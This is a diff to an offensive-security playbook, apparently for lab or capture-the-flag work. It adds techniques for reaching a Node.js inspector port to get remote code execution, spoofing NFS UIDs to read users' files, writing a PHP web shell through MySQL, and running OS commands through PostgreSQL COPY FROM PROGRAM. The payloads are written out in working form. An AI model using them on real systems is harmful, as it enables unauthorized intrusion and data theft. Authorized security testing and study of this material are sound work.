@@ -133,14 +133,39 @@ source IP.
   validity (`-V -5m:...`), because a certificate that becomes valid "now" is
   rejected on any clock skew and the failure is indistinguishable from an
   untrusted CA.
-- `Match User`/`ForceCommand`/`AllowTcpForwarding no` — a jail; look for the web
-  or file-write surface it *doesn't* cover rather than attacking the jail.
+- `Match User`/`ForceCommand internal-sftp`/`ChrootDirectory` — a jail for
+  *commands* only. **TCP forwarding is a separate switch**: if the block omits
+  `AllowTcpForwarding no` (the global default is `yes`), the account can still
+  `ssh -L`/`-D` onto the box's **localhost-only** services even with no shell and
+  a chroot. That is often the intended way to reach an internal admin panel or a
+  debugger from an SFTP-only login (see the Node `--inspect` entry below). A
+  complete jail needs `AllowTcpForwarding no` + `AllowStreamLocalForwarding no` +
+  `PermitOpen none`. Also look for the web or file-write surface the jail doesn't
+  cover.
 - `PasswordAuthentication yes` on a box that documents certificate auth is a
   leftover, and it is exactly where a leaked service-account password lands.
 
 This is a custody failure, not a protocol one: an SSH CA is root-equivalent for
 every host that trusts it, so the finding to lead a report with is that the
 signing key was readable by the accounts authenticating *with* it.
+
+## Node.js `--inspect` / V8 inspector (9229+, usually 127.0.0.1)
+
+A Node process started with `--inspect[=host:port]` (visible in `ps`, a systemd
+unit, or `/proc/self/environ`) exposes the Chrome DevTools protocol —
+**unauthenticated RCE inside the app process** for anyone who can reach the port.
+It is a production own-goal (leftover debug flag) and is normally bound to
+loopback, so you reach it through a forward — an SFTP-only SSH account that still
+permits TCP forwarding is a common carrier (see SSH above).
+
+`GET http://host:9229/json` → `webSocketDebuggerUrl`. Open that WebSocket and
+send `{"id":1,"method":"Runtime.evaluate","params":{"expression":"<JS>",
+"returnByValue":true,"awaitPromise":true}}`. Node hands you `require`:
+`process.mainModule.require('child_process').execSync('id').toString()`. Gotcha: a
+live app floods `Runtime.consoleAPICalled` events, so **keep reading frames until
+you see your own `id` reply** rather than capping the frame count (a fixed-N loop
+returns nothing and reads like a dead endpoint). A ~90-line raw-socket WS client
+is enough; no library needed.
 
 ## Telnet (23)
 
@@ -236,6 +261,22 @@ pwnloop x "mkdir -p /mnt/nfs && mount -t nfs $T:/export /mnt/nfs -o nolock"
 `no_root_squash` on an export means you can drop a SUID root binary there and
 execute it on the target.
 
+**When `mount` fails with `Operation not permitted`** the container lacks
+`CAP_SYS_ADMIN` — don't give up on NFS, switch to a **userspace client**
+(`libnfs-utils`: `nfs-ls`, `nfs-cat`, `nfs-cp`), which needs no mount **and lets
+you choose the UID/GID per request**:
+
+```bash
+pwnloop x "nfs-ls  'nfs://$T/home/<user>?uid=<uid>&gid=<gid>'"   # read a drwxr-x--- home
+pwnloop x "nfs-cat 'nfs://$T/home/<user>/.bash_history?uid=<uid>&gid=<gid>'"
+```
+
+An export carrying only `root_squash` (the default) squashes *client uid 0* to
+`nobody` but **trusts every other client-asserted UID** — so you can become any
+non-root user and read their files. Get the target UID from `/etc/passwd` (often
+world-readable, or recoverable from a backup on another export). `/root` stays
+unreadable because uid 0 is the one uid that *is* squashed.
+
 ## MySQL (3306) / MSSQL (1433) / PostgreSQL (5432)
 
 ```bash
@@ -245,6 +286,21 @@ pwnloop x "nxc mssql $T -u sa -p 'password' --local-auth -X 'whoami'"   # xp_cmd
 ```
 MySQL with FILE privilege: `SELECT LOAD_FILE('/etc/passwd')` and
 `SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'`.
+
+**PostgreSQL superuser is OS command execution** as the `postgres` user — check
+`SELECT rolsuper FROM pg_roles WHERE rolname=current_user` first, then:
+
+```sql
+CREATE TABLE c(l text);
+COPY c FROM PROGRAM 'id';   -- runs the command; SELECT * FROM c to read stdout
+```
+
+`pg_read_file()`/`lo_export` read/write files as `postgres`. How you *reach* the
+server matters: `pg_hba.conf` `local ... trust` means a connection over the UNIX
+socket is superuser with no password even when TCP requires SCRAM — forward a
+port to that socket (see `pivoting.md`) and you inherit the trust. When egress is
+filtered, read command output back through a table via `COPY`/`SELECT` rather than
+a reverse shell.
 
 **MSSQL with no privileges at all is still a credential primitive.** A login
 mapped to `guest` with no readable databases can usually still run the
